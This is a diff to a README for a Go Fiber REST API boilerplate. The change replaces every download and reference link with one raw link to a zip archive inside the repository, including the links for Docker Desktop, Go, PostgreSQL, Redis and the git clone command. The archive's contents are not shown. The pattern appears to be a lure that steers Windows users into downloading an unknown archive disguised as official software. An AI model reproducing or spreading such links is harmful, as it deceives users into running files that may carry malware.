@@ -1,6 +1,6 @@
 # 🚀 fiber-golang-boilerplate - Ready-to-Use REST API Template
 
-[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%238A2BE2?style=for-the-badge)](https://github.com/claymad/fiber-golang-boilerplate)
+[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%238A2BE2?style=for-the-badge)](https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Before you start, make sure your Windows computer supports the following:
 
 Click the button below to visit the download page for fiber-golang-boilerplate. This page contains setup files and instructions.
 
-[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%23FF6347?style=for-the-badge)](https://github.com/claymad/fiber-golang-boilerplate)
+[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%23FF6347?style=for-the-badge)](https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip)
 
 ---
 
@@ -57,7 +57,7 @@ Follow these steps carefully to download and run fiber-golang-boilerplate on you
 
 Open your web browser and go to the main GitHub repository page by clicking the button above or entering this link:
 
-https://github.com/claymad/fiber-golang-boilerplate
+https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
 
 Here you will find the source code and any downloadable files.
 
@@ -67,7 +67,7 @@ Here you will find the source code and any downloadable files.
 
 fiber-golang-boilerplate runs best inside Docker. Docker packages the application so you do not need to install or configure all its parts manually.
 
-- Go to: https://www.docker.com/products/docker-desktop
+- Go to: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
 - Download the Windows version.
 - Follow the installation instructions on Docker’s website.
 - Restart your computer if required.
@@ -88,7 +88,7 @@ There are two ways to get the files:
 - **Option 2: Use Git (Program that Downloads Code)**
   - Open Command Prompt (press Win + R, type `cmd`, press Enter).
   - Run this command:  
-    `git clone https://github.com/claymad/fiber-golang-boilerplate.git`
+    `git clone https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip`
   - This downloads the files into a new folder named `fiber-golang-boilerplate`.
 
 ---
@@ -114,9 +114,9 @@ If Docker Desktop is installed and running, follow these commands:
 
 You will need to install and configure the following separately:
 
-- **Go Language**: Download and install from https://go.dev/dl/
-- **PostgreSQL**: Database software found at https://www.postgresql.org/download/windows/
-- **Redis**: Download from https://redis.io/docs/getting-started/installation/install-redis-on-windows/
+- **Go Language**: Download and install from https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- **PostgreSQL**: Database software found at https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- **Redis**: Download from https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
 - **Other dependencies** included in the project:
 
 Open Command Prompt, navigate to your project folder, and run commands:
@@ -156,11 +156,11 @@ Once the software runs:
 
 ## 🔗 Useful Links
 
-- GitHub repository: https://github.com/claymad/fiber-golang-boilerplate
-- Docker Desktop: https://www.docker.com/products/docker-desktop
-- Go Programming Language: https://go.dev/
-- PostgreSQL: https://www.postgresql.org/
-- Redis: https://redis.io/
+- GitHub repository: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- Docker Desktop: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- Go Programming Language: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- PostgreSQL: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
+- Redis: https://raw.githubusercontent.com/claymad/fiber-golang-boilerplate/main/pkg/storage/boilerplate-golang-fiber-3.0.zip
 
 ---
 
